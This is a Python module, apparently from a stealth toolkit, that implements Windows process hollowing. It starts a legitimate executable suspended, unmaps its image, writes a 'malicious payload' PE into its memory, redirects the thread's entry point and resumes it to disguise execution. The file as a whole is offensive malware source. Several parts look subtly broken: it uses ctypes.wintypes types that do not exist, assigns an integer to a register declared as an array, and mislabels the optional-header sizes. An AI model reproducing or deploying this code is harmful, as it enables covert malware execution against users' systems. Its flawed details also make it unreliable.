# Process Hollowing Module
# Implements advanced process hollowing techniques for stealth execution

import os
import sys
import ctypes
import struct
from ctypes import wintypes
from config import DEBUG_MODE
from core.stealth import stealth_manager

class ProcessHollowingManager:
    """Manages process hollowing operations for stealth execution"""
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.hollowed_processes = []
        
        if self.is_windows:
            self._setup_windows_api()
    
    def _setup_windows_api(self):
        """Setup Windows API function prototypes"""
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            
            # Define necessary Windows API functions
            self.CreateProcessW = kernel32.CreateProcessW
            self.CreateProcessW.argtypes = [
                wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPSECURITY_ATTRIBUTES,
                wintypes.LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD,
                wintypes.LPVOID, wintypes.LPCWSTR, wintypes.LPSTARTUPINFOW,
                wintypes.LPPROCESS_INFORMATION
            ]
            self.CreateProcessW.restype = wintypes.BOOL
            
            self.VirtualAllocEx = kernel32.VirtualAllocEx
            self.VirtualAllocEx.argtypes = [
                wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                wintypes.DWORD, wintypes.DWORD
            ]
            self.VirtualAllocEx.restype = wintypes.LPVOID
            
            self.WriteProcessMemory = kernel32.WriteProcessMemory
            self.WriteProcessMemory.argtypes = [
                wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID,
                ctypes.c_size_t, wintypes.LPDWORD
            ]
            self.WriteProcessMemory.restype = wintypes.BOOL
            
            self.ReadProcessMemory = kernel32.ReadProcessMemory
            self.ReadProcessMemory.argtypes = [
                wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID,
                ctypes.c_size_t, wintypes.LPDWORD
            ]
            self.ReadProcessMemory.restype = wintypes.BOOL
            
            self.VirtualProtectEx = kernel32.VirtualProtectEx
            self.VirtualProtectEx.argtypes = [
                wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                wintypes.DWORD, wintypes.PDWORD
            ]
            self.VirtualProtectEx.restype = wintypes.BOOL
            
            self.GetThreadContext = kernel32.GetThreadContext
            self.GetThreadContext.argtypes = [wintypes.HANDLE, wintypes.LPCONTEXT]
            self.GetThreadContext.restype = wintypes.BOOL
            
            self.SetThreadContext = kernel32.SetThreadContext
            self.SetThreadContext.argtypes = [wintypes.HANDLE, wintypes.LPCONTEXT]
            self.SetThreadContext.restype = wintypes.BOOL
            
            self.ResumeThread = kernel32.ResumeThread
            self.ResumeThread.argtypes = [wintypes.HANDLE]
            self.ResumeThread.restype = wintypes.DWORD
            
            self.NtUnmapViewOfSection = ntdll.NtUnmapViewOfSection
            self.NtUnmapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.LPVOID]
            self.NtUnmapViewOfSection.restype = wintypes.LONG
            
            # Constants
            self.CREATE_SUSPENDED = 0x00000004
            self.MEM_COMMIT = 0x00001000
            self.MEM_RESERVE = 0x00002000
            self.PAGE_EXECUTE_READWRITE = 0x40
            self.PAGE_READWRITE = 0x04
            self.CONTEXT_FULL = 0x00010007
            
            # Context structure for x64
            class CONTEXT(ctypes.Structure):
                _fields_ = [
                    ("P1Home", wintypes.DWORD * 2),
                    ("P2Home", wintypes.DWORD * 2),
                    ("P3Home", wintypes.DWORD * 2),
                    ("P4Home", wintypes.DWORD * 2),
                    ("P5Home", wintypes.DWORD * 2),
                    ("P6Home", wintypes.DWORD * 2),
                    ("ContextFlags", wintypes.DWORD),
                    ("MxCsr", wintypes.DWORD),
                    ("SegCs", wintypes.WORD),
                    ("SegDs", wintypes.WORD),
                    ("SegEs", wintypes.WORD),
                    ("SegFs", wintypes.WORD),
                    ("SegGs", wintypes.WORD),
                    ("SegSs", wintypes.WORD),
                    ("EFlags", wintypes.DWORD),
                    ("Rax", wintypes.DWORD * 2),
                    ("Rcx", wintypes.DWORD * 2),
                    ("Rdx", wintypes.DWORD * 2),
                    ("Rbx", wintypes.DWORD * 2),
                    ("Rsp", wintypes.DWORD * 2),
                    ("Rbp", wintypes.DWORD * 2),
                    ("Rsi", wintypes.DWORD * 2),
                    ("Rdi", wintypes.DWORD * 2),
                    ("R8", wintypes.DWORD * 2),
                    ("R9", wintypes.DWORD * 2),
                    ("R10", wintypes.DWORD * 2),
                    ("R11", wintypes.DWORD * 2),
                    ("R12", wintypes.DWORD * 2),
                    ("R13", wintypes.DWORD * 2),
                    ("R14", wintypes.DWORD * 2),
                    ("R15", wintypes.DWORD * 2),
                    ("Rip", wintypes.DWORD * 2),
                    ("FltSave", wintypes.DWORD),
                    ("VectorRegister", wintypes.DWORD * 26),
                    ("VectorControl", wintypes.DWORD * 2),
                    ("DebugControl", wintypes.DWORD * 2),
                    ("LastBranchToRip", wintypes.DWORD * 2),
                    ("LastBranchFromRip", wintypes.DWORD * 2),
                    ("LastExceptionToRip", wintypes.DWORD * 2),
                    ("LastExceptionFromRip", wintypes.DWORD * 2),
                ]
            
            self.CONTEXT = CONTEXT
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Windows API setup failed: {e}")
                )
            self.is_windows = False
    
    def hollow_process(self, target_executable_path, malicious_payload):
        """Perform process hollowing on target executable"""
        if not self.is_windows:
            return False
            
        try:
            # Step 1: Create target process in suspended state
            process_info = self._create_suspended_process(target_executable_path)
            if not process_info:
                return False
            
            # Step 2: Get malicious payload PE information
            pe_info = self._parse_pe_headers(malicious_payload)
            if not pe_info:
                self._cleanup_process(process_info)
                return False
            
            # Step 3: Unmap original executable from target process
            if not self._unmap_original_image(process_info, pe_info):
                self._cleanup_process(process_info)
                return False
            
            # Step 4: Allocate memory for malicious payload
            image_base = self._allocate_memory_for_payload(process_info, pe_info)
            if not image_base:
                self._cleanup_process(process_info)
                return False
            
            # Step 5: Write malicious payload headers
            if not self._write_payload_headers(process_info, image_base, malicious_payload, pe_info):
                self._cleanup_process(process_info)
                return False
            
            # Step 6: Write payload sections
            if not self._write_payload_sections(process_info, image_base, malicious_payload, pe_info):
                self._cleanup_process(process_info)
                return False
            
            # Step 7: Update process context
            if not self._update_process_context(process_info, image_base, pe_info):
                self._cleanup_process(process_info)
                return False
            
            # Step 8: Resume the hollowed process
            if self.ResumeThread(process_info['hThread']) == 0:
                self._cleanup_process(process_info)
                return False
            
            # Record successful hollowing
            self.hollowed_processes.append({
                'target_path': target_executable_path,
                'payload_size': len(malicious_payload),
                'process_id': process_info['dwProcessId'],
                'thread_id': process_info['dwThreadId'],
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'success': True
            })
            
            # Clean up handles
            self._cleanup_process(process_info)
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Process hollowing failed: {e}")
                )
            return False
    
    def _create_suspended_process(self, executable_path):
        """Create target process in suspended state"""
        try:
            startup_info = wintypes.STARTUPINFOW()
            startup_info.cb = ctypes.sizeof(startup_info)
            process_info = wintypes.PROCESS_INFORMATION()
            
            # Create process in suspended state
            success = self.CreateProcessW(
                executable_path,
                None,
                None,
                None,
                False,
                self.CREATE_SUSPENDED,
                None,
                None,
                ctypes.byref(startup_info),
                ctypes.byref(process_info)
            )
            
            if success:
                return {
                    'hProcess': process_info.hProcess,
                    'hThread': process_info.hThread,
                    'dwProcessId': process_info.dwProcessId,
                    'dwThreadId': process_info.dwThreadId
                }
            
            return None
            
        except Exception:
            return None
    
    def _parse_pe_headers(self, payload):
        """Parse PE headers from malicious payload"""
        try:
            if len(payload) < 64:  # Minimum DOS header size
                return None
            
            # Check DOS header
            if payload[:2] != b'MZ':
                return None
            
            # Get PE header offset
            pe_offset = struct.unpack('<I', payload[60:64])[0]
            
            if len(payload) < pe_offset + 24:  # Minimum PE header size
                return None
            
            # Check PE signature
            if payload[pe_offset:pe_offset+4] != b'PE\0\0':
                return None
            
            # Parse COFF header
            machine = struct.unpack('<H', payload[pe_offset+4:pe_offset+6])[0]
            num_sections = struct.unpack('<H', payload[pe_offset+6:pe_offset+8])[0]
            timestamp = struct.unpack('<I', payload[pe_offset+8:pe_offset+12])[0]
            optional_header_offset = pe_offset + 24
            
            # Parse optional header
            magic = struct.unpack('<H', payload[optional_header_offset:optional_header_offset+2])[0]
            if magic != 0x10b and magic != 0x20b:  # PE32 or PE32+
                return None
            
            entry_point = struct.unpack('<I', payload[optional_header_offset+16:optional_header_offset+20])[0]
            image_base = struct.unpack('<I', payload[optional_header_offset+28:optional_header_offset+32])[0]
            section_alignment = struct.unpack('<I', payload[optional_header_offset+36:optional_header_offset+40])[0]
            file_alignment = struct.unpack('<I', payload[optional_header_offset+40:optional_header_offset+44])[0]
            image_size = struct.unpack('<I', payload[optional_header_offset+56:optional_header_offset+60])[0]
            headers_size = struct.unpack('<I', payload[optional_header_offset+60:optional_header_offset+64])[0]
            
            return {
                'pe_offset': pe_offset,
                'entry_point': entry_point,
                'image_base': image_base,
                'image_size': image_size,
                'section_alignment': section_alignment,
                'file_alignment': file_alignment,
                'headers_size': headers_size,
                'num_sections': num_sections,
                'sections_offset': optional_header_offset + (96 if magic == 0x20b else 224)
            }
            
        except Exception:
            return None
    
    def _unmap_original_image(self, process_info, pe_info):
        """Unmap the original executable from target process"""
        try:
            # Read process PEB to find image base
            context = self.CONTEXT()
            context.ContextFlags = self.CONTEXT_FULL
            
            if not self.GetThreadContext(process_info['hThread'], ctypes.byref(context)):
                return False
            
            # For simplicity, assume we can unmap at the original image base
            # In a real implementation, we'd need to read the PEB to find the actual base
            result = self.NtUnmapViewOfSection(process_info['hProcess'], pe_info['image_base'])
            
            return result >= 0  # NTSTATUS success
            
        except Exception:
            return False
    
    def _allocate_memory_for_payload(self, process_info, pe_info):
        """Allocate memory in target process for malicious payload"""
        try:
            image_base = self.VirtualAllocEx(
                process_info['hProcess'],
                pe_info['image_base'],
                pe_info['image_size'],
                self.MEM_COMMIT | self.MEM_RESERVE,
                self.PAGE_EXECUTE_READWRITE
            )
            
            return image_base
            
        except Exception:
            return None
    
    def _write_payload_headers(self, process_info, image_base, payload, pe_info):
        """Write PE headers to target process"""
        try:
            # Write headers up to sections
            headers_data = payload[:pe_info['sections_offset']]
            bytes_written = wintypes.DWORD()
            
            success = self.WriteProcessMemory(
                process_info['hProcess'],
                image_base,
                headers_data,
                len(headers_data),
                ctypes.byref(bytes_written)
            )
            
            return success and bytes_written.value == len(headers_data)
            
        except Exception:
            return False
    
    def _write_payload_sections(self, process_info, image_base, payload, pe_info):
        """Write PE sections to target process"""
        try:
            # Parse and write each section
            section_header_size = 40
            current_offset = pe_info['sections_offset']
            
            for i in range(pe_info['num_sections']):
                if len(payload) < current_offset + section_header_size:
                    break
                
                # Parse section header
                section_data = payload[current_offset:current_offset + section_header_size]
                virtual_address = struct.unpack('<I', section_data[12:16])[0]
                size_of_raw_data = struct.unpack('<I', section_data[16:20])[0]
                pointer_to_raw_data = struct.unpack('<I', section_data[20:24])[0]
                
                if size_of_raw_data > 0 and pointer_to_raw_data > 0:
                    # Write section data
                    section_payload = payload[pointer_to_raw_data:pointer_to_raw_data + size_of_raw_data]
                    target_address = image_base + virtual_address
                    
                    bytes_written = wintypes.DWORD()
                    success = self.WriteProcessMemory(
                        process_info['hProcess'],
                        target_address,
                        section_payload,
                        len(section_payload),
                        ctypes.byref(bytes_written)
                    )
                    
                    if not success:
                        return False
                
                current_offset += section_header_size
            
            return True
            
        except Exception:
            return False
    
    def _update_process_context(self, process_info, image_base, pe_info):
        """Update process context to point to new entry point"""
        try:
            context = self.CONTEXT()
            context.ContextFlags = self.CONTEXT_FULL
            
            # Get current context
            if not self.GetThreadContext(process_info['hThread'], ctypes.byref(context)):
                return False
            
            # Update entry point (Rip for x64)
            new_entry_point = image_base + pe_info['entry_point']
            context.Rip = new_entry_point
            
            # Set updated context
            return self.SetThreadContext(process_info['hThread'], ctypes.byref(context))
            
        except Exception:
            return False
    
    def _cleanup_process(self, process_info):
        """Clean up process handles"""
        try:
            if process_info.get('hThread'):
                ctypes.windll.kernel32.CloseHandle(process_info['hThread'])
            if process_info.get('hProcess'):
                ctypes.windll.kernel32.CloseHandle(process_info['hProcess'])
        except Exception:
            pass
    
    def get_hollowing_history(self):
        """Get history of hollowed processes"""
        return self.hollowed_processes
    
    def clear_hollowing_history(self):
        """Clear hollowing history"""
        self.hollowed_processes.clear()

# Global process hollowing manager instance
process_hollowing_manager = ProcessHollowingManager()
